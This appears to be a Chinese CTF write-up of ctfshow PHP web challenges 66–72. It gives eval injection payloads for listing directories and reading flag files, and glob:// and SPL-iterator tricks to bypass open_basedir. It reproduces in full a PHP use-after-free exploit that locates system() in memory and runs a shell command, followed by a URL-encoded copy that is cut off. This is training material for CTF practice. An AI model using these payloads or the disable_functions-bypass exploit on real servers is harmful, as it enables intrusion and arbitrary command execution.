此题highlight_file() show_source() file_get_contents() 以及伪代码在此无效了

法一：

<strong>66		c=print_r(scandir(<span style="color: rgb(163, 21, 21)">'/'</span>));</strong>

<strong>67 68	c=var_dump(glob('/*'));或var_dump(scandir('/'));</strong>

<strong>69 70	c=var_export(scandir(<span style="color: rgb(163, 21, 21)">"/"</span>));</strong>

扫描目录得知flag.txt在根目录底下

接着

<strong>66 67 	highlight_file('/flag.txt');</strong>

<strong>68 69 70	c=include(<span style="color: rgb(163, 21, 21)">"/flag.txt"</span>);</strong>

解释：

<strong>scandir();</strong>

<strong>glob();		</strong>扫描目录

其中第70题目显示禁用函数

+ <strong>error_reporting()：设置应该报告何种 PHP 错误。</strong>
+ <strong>ini_set()：配置选项设置值。</strong>

对这题来说没啥用的函数。

### web71

```php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
```


用<strong>exit()/die()</strong>提前结束程序  
\$s = ob_get_contents();	   //得到缓冲区的数据。  
ob_end_clean();		   //会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容  
<strong>答案：</strong>

<strong>c=var_export(scandir('/'));exit();  
c=include("/flag.txt");die();</strong>

### glob://协议(摘)
glob 伪协议是 php 提供的一种特殊协议，可以用来查找文件路径 

不受 allow_url_fopen、allow_url_include 影响 

只用 glob://伪协议是不能直接绕过的，所以得结合其他函数一起使用。 

glob://伪协议的局限性在于它只能列出根目录下和 <strong>open_basedir </strong>指定目录下的文件，而且 

不能读取文件内容 

<strong><span style="color: #DF2A3F">open_basedir: </span></strong>

介绍：open_basedir 是 PHP 中的一项配置指令，用于限制 PHP 脚本对文件系统的访问 

范围。 

作用：当启用 open_basedir 时，PHP 脚本只能访问配置中指定的目录及其子目录 

<strong><span style="color: #DF2A3F">glob://绕过： </span></strong>

<mark style="background-color: #FBDE28; color: #222">(1) Directorylterator + glob:// </mark>

脚本如下： 


```php
<?php 
$c = $_GET['c']; 
$a = new DirectoryIterator($c); // 使用 DirectoryIterator 类来遍历目录 $c，此 
时的 a 即 DirectoryIterator 对象 
foreach($a as $f){ // 遍历目录中的每一个文件或文件夹，$f 是 
DirectoryIterator 对象中的每个文件或目录 
 echo($f->__toString().'<br>'); // 输出文件或文件夹的名称，并换行 
} 
?> 
```


DirectoryIterator 类是 php 的 SPL 类之一，提供了一个简单且高效的接口，用于遍历和查 

看文件系统目录的内容。 

foreach (\$array as \$value) 是一种循环方式，array 表示数组，value 表示数组当前元素 

`__toString()`是一种魔术方法，可以返回文件或目录的路径信息 

试着用上述方法打下 Web-72 关：playload 为： 

<strong>c=\$_GET`['a']`;\$a = new DirectoryIterator('glob:///*');foreach(\$a as </strong>

<strong>\$f){echo(\$f->`__toString()`.' ');};exit(); </strong>

<strong>或 </strong>

<strong>c=\$a=new DirectoryIterator('glob:///*');foreach(\$a as \$f){echo(\$f->`__toString()`." </strong>

<strong>");};exit(); </strong>


<details>
<summary>代码解释</summary>


```php
<?php

$a = new DirectoryIterator("glob:///*");

foreach ($a as $f)

{

echo ($f->__toString().' ');

}

exit(0);

?>
```



#### 1. `<?php ... ?>`

- 这是PHP的标签，表示该部分代码是PHP代码，服务器会解析这段代码并执行。`<?php` 表示PHP代码块的开始，`?>` 表示PHP代码块的结束。

#### 2. `$a = new DirectoryIterator("glob:///*");`

- `DirectoryIterator` 是PHP内置的一个类，用来遍历文件夹中的文件和目录。`new DirectoryIterator("glob:///*")` 创建了一个新的 `DirectoryIterator` 对象。
- `"glob:///*"` 这里的路径是一个 <strong>glob URL</strong>，这是PHP的一个特殊URL包装器，允许你使用类似于文件系统的路径模式（例如，使用通配符）来访问文件。`glob:///*` 表示匹配当前目录下的所有文件和目录。

- `glob://` 是PHP的 glob URL Wrapper，它使你能够通过 glob 模式来列出文件。`*` 是通配符，表示当前目录下的所有文件。

- 这行代码创建了一个 `DirectoryIterator` 对象，该对象会根据提供的路径（在这里是当前目录下的所有文件）进行文件夹遍历。

#### 3. `foreach ($a as $f)`

- `foreach` 是PHP中的一种循环结构，用于遍历数组或实现 `Traversable` 接口的对象。
- `$a` 是我们前面创建的 `DirectoryIterator` 对象，它是一个 <strong>Traversable</strong> 类型，因此可以在 `foreach` 循环中逐个遍历。
- `$f` 代表当前 `DirectoryIterator` 中的每个文件（或目录）。在每次迭代中，`$f` 将是当前遍历到的文件或目录对象。

#### 4. `echo ($f->__toString().' ');`

- `$f->__toString()` 是 `DirectoryIterator` 类中的一个方法。该方法将 `DirectoryIterator` 对象转换为字符串，通常会返回当前文件或目录的路径（也可能是文件的名称）。

- 例如，假设 `$f` 是一个指向文件的 `DirectoryIterator` 对象，调用 `$f->__toString()` 将输出该文件的路径。

- `echo` 用来输出字符串到浏览器或终端。
- 由于 `__toString()` 输出的是文件或目录的路径，而 `.' '` 是一个字符串连接操作，它会在每个文件名后加上一个空格，以便让输出更清晰，多个文件或目录名之间用空格分隔。

#### 5. `exit(0);`

- `exit(0)` 用来终止脚本的执行。它会立即停止脚本的进一步执行，`0` 是退出代码，通常表示成功。如果脚本运行完毕后没有异常或错误，通常使用 `0` 来表示正常退出。
- 这里的 `exit(0)` 在输出完目录文件列表后终止脚本，不让其继续执行。

</details>


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-055.webp)

可以看到根目录已经出来了，找到了 flag0.txt 

试着用了其他的 SPL 类，发现也有几个可以绕过： 

FilesystemIterator 类（跟 DirectoryIterator 类似，比它高级） 

对应的 payload 为： 

<strong>c=\$a=new FilesystemIterator('glob:///*');foreach(\$a as \$f){echo(\$f->`__toString()`." </strong>

<strong>");};exit(); </strong>

RecursiveDirectoryIterator 类（类似 DirectoryIterator） 

对应的 payload 为： 

<strong>c=\$a=new RecursiveDirectoryIterator('glob:///*');foreach(\$a as </strong>

<strong>\$f){echo(\$f->`__toString()`." ");};exit(); </strong>

<mark style="background-color: #FBDE28; color: #222">(2) opendir() + readdir() + glob://: </mark>

脚本如下：<strong><?php </strong>

<strong>\$a = \$_GET`['c']`; </strong>_// 从 URL 参数中获取名为 'c' 的参数，并赋值给变量 \$a _

<strong>if ( \$b = opendir(\$a) ) { </strong>_// 使用 opendir() 打开目录，\$a 是目录路径， _

_\$b 被赋值为目录资源句柄，表示成功打开了目录\$a 的目录流 _

<strong>while ( (\$file = readdir(\$b)) !== false ) { </strong>_// 使用 readdir() 逐个读取目录中的文件 _

<strong>echo \$file."<br>"; </strong>_// 输出文件名，并换行 _

<strong>}closedir(\$b); </strong>_// 关闭目录资源 _

<strong>} </strong>

<strong>?> </strong>

opendir()的作用是打开一个目录流 

语法为: <strong>opendir(string \$directory)</strong>，\$directory 表示要打开的目录路径 (即上面的\$a)，如 

果目录成功打开，它会返回一个<strong>目录资源句柄</strong>，用来读取目录内容 

readdir()用于从 opendir() 打开的目录中读取文件名或文件夹名，括号里放目录资源句 

柄，如上面放了\$b 

closedir() 作用为关闭目录流，释放资源 

同样用上述方法打下 Web-72 关： 

payload 为： 

<strong>c=\$a=('glob:///*');if(\$c=opendir(\$a)){while ((\$file=readdir(\$c))!==false){echo \$file." </strong>

<strong>";}closedir(\$c);};exit(); </strong>

<strong>或 </strong>

<strong>c=if(\$c=opendir('glob:///*')){while((\$file=readdir(\$c))!==false){echo \$file." </strong>

<strong>";}closedir(\$c);};exit(); </strong>

结果为：
![](/article-assets/2025/ctfshow-web-notes/images/screenshot-056.webp)

可以看到根目录出来了，找到 flag0.txt 

<mark style="background-color: #FBDE28; color: #222">(3) scandir()+glob:// </mark>

scandir()函数可以列出指定路径中的文件和目录 

而 print_r()函数可以打印变量 

所以可以变成 print_r(scandir('glob:///*')); 

print_r()函数可以换成下列函数： 

var_export() 

var_dump() 

debug_zval_dump() 

等

### glob://协议(自总)
+ `glob:///*` 匹配的是根目录下的所有文件和目录。
+ `glob://*` 匹配的是当前目录下的所有文件和目录。

##### 1.使用 `DirectoryIterator` 类与 `glob://` 模式
`DirectoryIterator` 类是用于遍历目录和文件的类。通过将 `glob://` 路径传递给 `DirectoryIterator`，你可以遍历匹配的文件。

<strong>示例：</strong>


```php
<?php
  // 创建 DirectoryIterator 对象，遍历 glob:// 路径
  $iterator = new DirectoryIterator("glob://*.php");

// 输出当前目录下的所有 .php 文件
foreach ($iterator as $fileinfo) {
  echo $fileinfo->getFilename() . "\n";
}
?>
```


+ 这里使用了 `glob://*.php` 路径，告诉 `DirectoryIterator` 查找当前目录下所有的 PHP 文件。
+ `getFilename()` 获取每个文件的文件名。

##### 2. `glob://` 与文件目录
你可以将 `glob://` 与实际的文件路径结合使用。例如，如果你想要匹配某个子目录下的所有 `.txt` 文件，可以指定路径：

<strong>示例：</strong>


```php
<?php
// 获取 /path/to/directory/ 下所有 .txt 文件
$files = glob("glob:///path/to/directory/*.txt");

foreach ($files as $file) {
    echo $file . "\n";
}
?>
```


+ 这里的路径 `glob:///path/to/directory/*.txt` 指定了一个具体的目录，并且使用 `glob://` 匹配所有 `.txt` 文件

### web72

```php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
```


不能访问/，访问路径被限制了，只能允许访问的是/var/www/html/。

也就是说，本题设置了open_basedir，将php所能打开的文件限制在指定的目录树中,包括文件本身。因为ini_set()也被限制了，所以open_basedir不能用ini_set重新设置绕过。

（附上一个用ini_set绕过open_basedir的脚本地址，本题不可用）


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-057.webp)


```php
<?php 
	$a = new DirectoryIterator("glob:///*");
	foreach ($a as $f) 
	{
		echo ($f->__toString().' ');
	} 
	exit(0); 
?>//注意缩进问题
```


或<strong>`<?php $a = new DirectoryIterator("glob:///*");foreach ($a as $f) {echo ($f->__toString().' ');} exit(0); ?>`</strong>

其实不加前面?>`<?php也是可以的。eval里的语句可以视为在当前php文件里加了几条语句，这些语句必须是完整的，即必须以;或者?>`结尾来结束语句，但是eval里的?>不会闭合当前的php文件，所以当前php页面后续的语句都是会执行的。


可以看一下下面的图片，eval里的语句可以修改文件的变量值，但是?>并不会闭合外面的PHP语句。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-058.webp)

通过上面方法找到文件 flag0.txt。但是 include() 已经无法使用。

ctfshow 提供了这道题的 POC（一个绕过安全目录的脚本）。  
据说利用了 php 的垃圾回收机制。代码涉及到偏移地址之类的。先放这里吧。


```php
<?php
function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
?>
```


把以上代码通过 url 编码，然后传递即可。  
 


<details>
<summary>脚本编码</summary>

c=%3f%3e%3c%3f%70%68%70%0a%66%75%6e%63%74%69%6f%6e%20%63%74%66%73%68%6f%77%28%24%63%6d%64%29%20%7b%0a%20%20%20%20%67%6c%6f%62%61%6c%20%24%61%62%63%2c%20%24%68%65%6c%70%65%72%2c%20%24%62%61%63%6b%74%72%61%63%65%3b%0a%0a%20%20%20%20%63%6c%61%73%73%20%56%75%6c%6e%20%7b%0a%20%20%20%20%20%20%20%20%70%75%62%6c%69%63%20%24%61%3b%0a%20%20%20%20%20%20%20%20%70%75%62%6c%69%63%20%66%75%6e%63%74%69%6f%6e%20%5f%5f%64%65%73%74%72%75%63%74%28%29%20%7b%20%0a%20%20%20%20%20%20%20%20%20%20%20%20%67%6c%6f%62%61%6c%20%24%62%61%63%6b%74%72%61%63%65%3b%20%0a%20%20%20%20%20%20%20%20%20%20%20%20%75%6e%73%65%74%28%24%74%68%69%73%2d%3e%61%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%62%61%63%6b%74%72%61%63%65%20%3d%20%28%6e%65%77%20%45%78%63%65%70%74%69%6f%6e%29%2d%3e%67%65%74%54%72%61%63%65%28%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%21%69%73%73%65%74%28%24%62%61%63%6b%74%72%61%63%65%5b%31%5d%5b%27%61%72%67%73%27%5d%29%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%62%61%63%6b%74%72%61%63%65%20%3d%20%64%65%62%75%67%5f%62%61%63%6b%74%72%61%63%65%28%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%7d%0a%0a%20%20%20%20%63%6c%61%73%73%20%48%65%6c%70%65%72%20%7b%0a%20%20%20%20%20%20%20%20%70%75%62%6c%69%63%20%24%61%2c%20%24%62%2c%20%24%63%2c%20%24%64%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%73%74%72%32%70%74%72%28%26%24%73%74%72%2c%20%24%70%20%3d%20%30%2c%20%24%73%20%3d%20%38%29%20%7b%0a%20%20%20%20%20%20%20%20%24%61%64%64%72%65%73%73%20%3d%20%30%3b%0a%20%20%20%20%20%20%20%20%66%6f%72%28%24%6a%20%3d%20%24%73%2d%31%3b%20%24%6a%20%3e%3d%20%30%3b%20%24%6a%2d%2d%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%61%64%64%72%65%73%73%20%3c%3c%3d%20%38%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%61%64%64%72%65%73%73%20%7c%3d%20%6f%72%64%28%24%73%74%72%5b%24%70%2b%24%6a%5d%29%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%24%61%64%64%72%65%73%73%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%74%72%32%73%74%72%28%24%70%74%72%2c%20%24%6d%20%3d%20%38%29%20%7b%0a%20%20%20%20%20%20%20%20%24%6f%75%74%20%3d%20%22%22%3b%0a%20%20%20%20%20%20%20%20%66%6f%72%20%28%24%69%3d%30%3b%20%24%69%20%3c%20%24%6d%3b%20%24%69%2b%2b%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%6f%75%74%20%2e%3d%20%73%70%72%69%6e%74%66%28%22%25%63%22%2c%28%24%70%74%72%20%26%20%30%78%66%66%29%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%70%74%72%20%3e%3e%3d%20%38%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%24%6f%75%74%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%77%72%69%74%65%28%26%24%73%74%72%2c%20%24%70%2c%20%24%76%2c%20%24%6e%20%3d%20%38%29%20%7b%0a%20%20%20%20%20%20%20%20%24%69%20%3d%20%30%3b%0a%20%20%20%20%20%20%20%20%66%6f%72%28%24%69%20%3d%20%30%3b%20%24%69%20%3c%20%24%6e%3b%20%24%69%2b%2b%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%73%74%72%5b%24%70%20%2b%20%24%69%5d%20%3d%20%73%70%72%69%6e%74%66%28%22%25%63%22%2c%28%24%76%20%26%20%30%78%66%66%29%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%76%20%3e%3e%3d%20%38%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%7d%0a%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%6c%65%61%6b%28%24%61%64%64%72%2c%20%24%70%20%3d%20%30%2c%20%24%73%20%3d%20%38%29%20%7b%0a%20%20%20%20%20%20%20%20%67%6c%6f%62%61%6c%20%24%61%62%63%2c%20%24%68%65%6c%70%65%72%3b%0a%20%20%20%20%20%20%20%20%77%72%69%74%65%28%24%61%62%63%2c%20%30%78%36%38%2c%20%24%61%64%64%72%20%2b%20%24%70%20%2d%20%30%78%31%30%29%3b%0a%20%20%20%20%20%20%20%20%24%6c%65%61%6b%20%3d%20%73%74%72%6c%65%6e%28%24%68%65%6c%70%65%72%2d%3e%61%29%3b%0a%20%20%20%20%20%20%20%20%69%66%28%24%73%20%21%3d%20%38%29%20%7b%20%24%6c%65%61%6b%20%25%3d%20%32%20%3c%3c%20%28%24%73%20%2a%20%38%29%20%2d%20%31%3b%20%7d%0a%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%24%6c%65%61%6b%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%61%72%73%65%5f%65%6c%66%28%24%62%61%73%65%29%20%7b%0a%20%20%20%20%20%20%20%20%24%65%5f%74%79%70%65%20%3d%20%6c%65%61%6b%28%24%62%61%73%65%2c%20%30%78%31%30%2c%20%32%29%3b%0a%0a%20%20%20%20%20%20%20%20%24%65%5f%70%68%6f%66%66%20%3d%20%6c%65%61%6b%28%24%62%61%73%65%2c%20%30%78%32%30%29%3b%0a%20%20%20%20%20%20%20%20%24%65%5f%70%68%65%6e%74%73%69%7a%65%20%3d%20%6c%65%61%6b%28%24%62%61%73%65%2c%20%30%78%33%36%2c%20%32%29%3b%0a%20%20%20%20%20%20%20%20%24%65%5f%70%68%6e%75%6d%20%3d%20%6c%65%61%6b%28%24%62%61%73%65%2c%20%30%78%33%38%2c%20%32%29%3b%0a%0a%20%20%20%20%20%20%20%20%66%6f%72%28%24%69%20%3d%20%30%3b%20%24%69%20%3c%20%24%65%5f%70%68%6e%75%6d%3b%20%24%69%2b%2b%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%68%65%61%64%65%72%20%3d%20%24%62%61%73%65%20%2b%20%24%65%5f%70%68%6f%66%66%20%2b%20%24%69%20%2a%20%24%65%5f%70%68%65%6e%74%73%69%7a%65%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%70%5f%74%79%70%65%20%20%3d%20%6c%65%61%6b%28%24%68%65%61%64%65%72%2c%20%30%2c%20%34%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%70%5f%66%6c%61%67%73%20%3d%20%6c%65%61%6b%28%24%68%65%61%64%65%72%2c%20%34%2c%20%34%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%70%5f%76%61%64%64%72%20%3d%20%6c%65%61%6b%28%24%68%65%61%64%65%72%2c%20%30%78%31%30%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%70%5f%6d%65%6d%73%7a%20%3d%20%6c%65%61%6b%28%24%68%65%61%64%65%72%2c%20%30%78%32%38%29%3b%0a%0a%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%24%70%5f%74%79%70%65%20%3d%3d%20%31%20%26%26%20%24%70%5f%66%6c%61%67%73%20%3d%3d%20%36%29%20%7b%20%0a%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%64%61%74%61%5f%61%64%64%72%20%3d%20%24%65%5f%74%79%70%65%20%3d%3d%20%32%20%3f%20%24%70%5f%76%61%64%64%72%20%3a%20%24%62%61%73%65%20%2b%20%24%70%5f%76%61%64%64%72%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%64%61%74%61%5f%73%69%7a%65%20%3d%20%24%70%5f%6d%65%6d%73%7a%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%65%6c%73%65%20%69%66%28%24%70%5f%74%79%70%65%20%3d%3d%20%31%20%26%26%20%24%70%5f%66%6c%61%67%73%20%3d%3d%20%35%29%20%7b%20%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%74%65%78%74%5f%73%69%7a%65%20%3d%20%24%70%5f%6d%65%6d%73%7a%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%0a%20%20%20%20%20%20%20%20%69%66%28%21%24%64%61%74%61%5f%61%64%64%72%20%7c%7c%20%21%24%74%65%78%74%5f%73%69%7a%65%20%7c%7c%20%21%24%64%61%74%61%5f%73%69%7a%65%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%66%61%6c%73%65%3b%0a%0a%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%5b%24%64%61%74%61%5f%61%64%64%72%2c%20%24%74%65%78%74%5f%73%69%7a%65%2c%20%24%64%61%74%61%5f%73%69%7a%65%5d%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%67%65%74%5f%62%61%73%69%63%5f%66%75%6e%63%73%28%24%62%61%73%65%2c%20%24%65%6c%66%29%20%7b%0a%20%20%20%20%20%20%20%20%6c%69%73%74%28%24%64%61%74%61%5f%61%64%64%72%2c%20%24%74%65%78%74%5f%73%69%7a%65%2c%20%24%64%61%74%61%5f%73%69%7a%65%29%20%3d%20%24%65%6c%66%3b%0a%20%20%20%20%20%20%20%20%66%6f%72%28%24%69%20%3d%20%30%3b%20%24%69%20%3c%20%24%64%61%74%61%5f%73%69%7a%65%20%2f%20%38%3b%20%24%69%2b%2b%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%6c%65%61%6b%20%3d%20%6c%65%61%6b%28%24%64%61%74%61%5f%61%64%64%72%2c%20%24%69%20%2a%20%38%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%24%6c%65%61%6b%20%2d%20%24%62%61%73%65%20%3e%20%30%20%26%26%20%24%6c%65%61%6b%20%2d%20%24%62%61%73%65%20%3c%20%24%64%61%74%61%5f%61%64%64%72%20%2d%20%24%62%61%73%65%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%64%65%72%65%66%20%3d%20%6c%65%61%6b%28%24%6c%65%61%6b%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%24%64%65%72%65%66%20%21%3d%20%30%78%37%34%36%65%36%31%37%34%37%33%36%65%36%66%36%33%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6f%6e%74%69%6e%75%65%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%65%6c%73%65%20%63%6f%6e%74%69%6e%75%65%3b%0a%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%6c%65%61%6b%20%3d%20%6c%65%61%6b%28%24%64%61%74%61%5f%61%64%64%72%2c%20%28%24%69%20%2b%20%34%29%20%2a%20%38%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%24%6c%65%61%6b%20%2d%20%24%62%61%73%65%20%3e%20%30%20%26%26%20%24%6c%65%61%6b%20%2d%20%24%62%61%73%65%20%3c%20%24%64%61%74%61%5f%61%64%64%72%20%2d%20%24%62%61%73%65%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%64%65%72%65%66%20%3d%20%6c%65%61%6b%28%24%6c%65%61%6b%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%24%64%65%72%65%66%20%21%3d%20%30%78%37%38%36%35%36%38%33%32%36%65%36%39%36%32%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6f%6e%74%69%6e%75%65%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%65%6c%73%65%20%63%6f%6e%74%69%6e%75%65%3b%0a%0a%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%24%64%61%74%61%5f%61%64%64%72%20%2b%20%24%69%20%2a%20%38%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%7d%0a%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%67%65%74%5f%62%69%6e%61%72%79%5f%62%61%73%65%28%24%62%69%6e%61%72%79%5f%6c%65%61%6b%29%20%7b%0a%20%20%20%20%20%20%20%20%24%62%61%73%65%20%3d%20%30%3b%0a%20%20%20%20%20%20%20%20%24%73%74%61%72%74%20%3d%20%24%62%69%6e%61%72%79%5f%6c%65%61%6b%20%26%20%30%78%66%66%66%66%66%66%66%66%66%66%66%66%66%30%30%30%3b%0a%20%20%20%20%20%20%20%20%66%6f%72%28%24%69%20%3d%20%30%3b%20%24%69%20%3c%20%30%78%31%30%30%30%3b%20%24%69%2b%2b%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%61%64%64%72%20%3d%20%24%73%74%61%72%74%20%2d%20%30%78%31%30%30%30%20%2a%20%24%69%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%6c%65%61%6b%20%3d%20%6c%65%61%6b%28%24%61%64%64%7